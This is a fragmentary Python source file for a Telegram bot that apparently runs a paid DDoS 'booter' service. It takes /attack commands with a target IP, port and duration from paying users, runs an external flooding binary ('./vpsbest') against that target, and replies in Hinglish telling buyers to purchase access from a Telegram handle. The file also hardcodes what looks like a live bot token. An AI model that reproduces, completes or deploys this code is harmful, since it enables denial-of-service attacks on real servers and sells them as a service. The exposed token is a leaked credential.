...
bot = telebot.TeleBot('8057906498:AAGupp0dBEPTvFds5ZEdls582quVOGLluXM')
...
 Usage: /remove <userid>'''
        ...
        response = "**Purchase karle :- @Systum_dead** ."
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"attack start : {target}:{port} for {time}\nSEC Jabtak YE attack  run krrha hai to iske bichme koi apni attack nahe Dalna"
    bot.reply_to(message, response)
...
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        if attack_running:
            response = "**Abhi attack  Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Lgana** ."
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:  # Updated to accept target, port, and time
            ...
            if time > 240:
                ...
                try:
                    ...
                    full_command = f"./vpsbest {target} {port} {time} {12} {900}"
